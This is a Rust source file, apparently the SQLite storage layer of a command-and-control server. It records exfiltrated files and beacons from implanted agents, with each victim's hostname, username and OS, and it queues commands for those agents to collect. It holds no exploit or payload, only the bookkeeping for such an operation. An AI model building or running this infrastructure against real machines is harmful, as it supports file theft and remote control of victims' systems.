use rusqlite::{params, Connection, Result};
use serde_json::Value;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

pub struct Db {
    conn: Connection,
}

impl Db {
    pub fn open(path: &Path) -> Result<Self> {
        let conn = Connection::open(path)?;
        let db = Self { conn };
        db.migrate()?;
        Ok(db)
    }

    fn migrate(&self) -> Result<()> {
        self.conn.execute_batch(
            "
            CREATE TABLE IF NOT EXISTS exfils (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp INTEGER NOT NULL,
                agent_id TEXT NOT NULL,
                agent_role TEXT NOT NULL,
                filename TEXT NOT NULL,
                size INTEGER NOT NULL,
                sha256 TEXT NOT NULL,
                filepath TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS beacons (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp INTEGER NOT NULL,
                agent_id TEXT NOT NULL,
                agent_role TEXT NOT NULL,
                hostname TEXT DEFAULT '',
                username TEXT DEFAULT '',
                os TEXT DEFAULT '',
                version TEXT DEFAULT '',
                extra TEXT DEFAULT '{}'
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created INTEGER NOT NULL,
                agent_id TEXT NOT NULL,
                task_id TEXT NOT NULL,
                command TEXT NOT NULL,
                payload TEXT NOT NULL,
                claimed INTEGER DEFAULT 0,
                completed INTEGER DEFAULT 0
            );
            CREATE INDEX IF NOT EXISTS idx_tasks_agent ON tasks(agent_id, claimed);
            CREATE INDEX IF NOT EXISTS idx_beacons_ts ON beacons(timestamp DESC);
            CREATE INDEX IF NOT EXISTS idx_exfils_ts ON exfils(timestamp DESC);
            ",
        )?;
        Ok(())
    }

    fn now() -> i64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64
    }

    pub fn record_exfil(
        &self,
        agent_id: &str,
        agent_role: &str,
        filename: &str,
        size: usize,
        sha256: &str,
        filepath: &Path,
    ) {
        let ts = Self::now();
        let _ = self.conn.execute(
            "INSERT INTO exfils (timestamp, agent_id, agent_role, filename, size, sha256, filepath)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![
                ts,
                agent_id,
                agent_role,
                filename,
                size as i64,
                sha256,
                filepath.to_string_lossy().as_ref()
            ],
        );
    }

    pub fn record_beacon(
        &self,
        agent_id: &str,
        agent_role: &str,
        hostname: &str,
        username: &str,
        os: &str,
        version: &str,
        extra: &Value,
    ) {
        let ts = Self::now();
        let extra_str = serde_json::to_string(extra).unwrap_or_default();
        let _ = self.conn.execute(
            "INSERT INTO beacons (timestamp, agent_id, agent_role, hostname, username, os, version, extra)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            params![ts, agent_id, agent_role, hostname, username, os, version, extra_str],
        );
    }

    pub fn push_task(&self, agent_id: &str, task_id: &str, command: &str, payload: &Value) {
        let ts = Self::now();
        let payload_str = serde_json::to_string(payload).unwrap_or_default();
        let _ = self.conn.execute(
            "INSERT INTO tasks (created, agent_id, task_id, command, payload) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![ts, agent_id, task_id, command, payload_str],
        );
    }

    pub fn pending_tasks(&self, agent_id: &str) -> Vec<super::Task> {
        let mut stmt = self
            .conn
            .prepare(
                "SELECT task_id, command, payload FROM tasks
                 WHERE agent_id = ?1 AND claimed = 0 ORDER BY created ASC LIMIT 10",
            )
            .unwrap();
        let rows = stmt
            .query_map(params![agent_id], |row| {
                let task_id: String = row.get(0)?;
                let command: String = row.get(1)?;
                let payload_str: String = row.get(2)?;
                let payload: serde_json::Value =
                    serde_json::from_str(&payload_str).unwrap_or_default();
                Ok(super::Task {
                    id: task_id,
                    command,
                    payload,
                })
            })
            .unwrap();
        let tasks: Vec<super::Task> = rows.filter_map(|r| r.ok()).collect();

        for task in &tasks {
            let _ = self.conn.execute(
                "UPDATE tasks SET claimed = 1 WHERE task_id = ?1",
                params![task.id],
            );
        }

        tasks
    }

    pub fn counts(&self) -> (usize, usize) {
        let exfils: i64 = self
            .conn
            .query_row("SELECT COUNT(*) FROM exfils", [], |r| r.get(0))
            .unwrap_or(0);
        let beacons: i64 = self
            .conn
            .query_row("SELECT COUNT(*) FROM beacons", [], |r| r.get(0))
            .unwrap_or(0);
        (exfils as usize, beacons as usize)
    }

    pub fn recent_activity(&self, limit: usize) -> Vec<super::LogEntry> {
        let mut entries = Vec::new();
        if let Ok(mut stmt) = self
            .conn
            .prepare(
                "SELECT timestamp, agent_id, agent_role, filename, size, sha256
                 FROM exfils ORDER BY timestamp DESC LIMIT ?1",
            )
        {
            if let Ok(rows) = stmt.query_map(params![limit as i64], |row| {
                let ts: i64 = row.get(0)?;
                let agent_id: String = row.get(1)?;
                let agent_role: String = row.get(2)?;
                let filename: String = row.get(3)?;
                let size: i64 = row.get(4)?;
                let sha256: String = row.get(5)?;
                Ok(super::LogEntry {
                    timestamp: Self::format_ts(ts),
                    agent_id,
                    agent_role,
                    data: serde_json::json!({
                        "type": "exfil",
                        "filename": filename,
                        "size": size,
                        "sha256": sha256,
                    }),
                })
            }) {
                for row in rows.flatten() {
                    entries.push(row);
                }
            }
        }

        if let Ok(mut stmt) = self
            .conn
            .prepare(
                "SELECT timestamp, agent_id, agent_role, hostname, username, os, version
                 FROM beacons ORDER BY timestamp DESC LIMIT ?1",
            )
        {
            if let Ok(rows) = stmt.query_map(params![limit as i64], |row| {
                let ts: i64 = row.get(0)?;
                let agent_id: String = row.get(1)?;
                let agent_role: String = row.get(2)?;
                let hostname: String = row.get(3)?;
                let username: String = row.get(4)?;
                let os: String = row.get(5)?;
                let version: String = row.get(6)?;
                Ok(super::LogEntry {
                    timestamp: Self::format_ts(ts),
                    agent_id,
                    agent_role,
                    data: serde_json::json!({
                        "type": "beacon",
                        "hostname": hostname,
                        "username": username,
                        "os": os,
                        "version": version,
                    }),
                })
            }) {
                for row in rows.flatten() {
                    entries.push(row);
                }
            }
        }

        entries.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
        entries.truncate(limit);
        entries
    }

    pub fn agent_summary(&self) -> serde_json::Value {
        let mut agents = Vec::new();
        if let Ok(mut stmt) = self.conn.prepare(
            "SELECT agent_id, agent_role, hostname, username, os, version, MAX(timestamp)
             FROM beacons GROUP BY agent_id ORDER BY MAX(timestamp) DESC",
        ) {
            if let Ok(rows) = stmt.query_map([], |row| {
                let agent_id: String = row.get(0)?;
                let agent_role: String = row.get(1)?;
                let hostname: String = row.get(2)?;
                let username: String = row.get(3)?;
                let os: String = row.get(4)?;
                let version: String = row.get(5)?;
                let last_seen: i64 = row.get(6)?;
                Ok(serde_json::json!({
                    "agent_id": agent_id,
                    "agent_role": agent_role,
                    "hostname": hostname,
                    "username": username,
                    "os": os,
                    "version": version,
                    "last_seen": Self::format_ts(last_seen),
                }))
            }) {
                for row in rows.flatten() {
                    agents.push(row);
                }
            }
        }
        serde_json::json!({ "agents": agents })
    }

    fn format_ts(ts: i64) -> String {
        let dt: chrono::DateTime<chrono::Utc> =
            chrono::DateTime::from_timestamp(ts, 0).unwrap_or_default();
        dt.format("%Y-%m-%d %H:%M:%S UTC").to_string()
    }
}
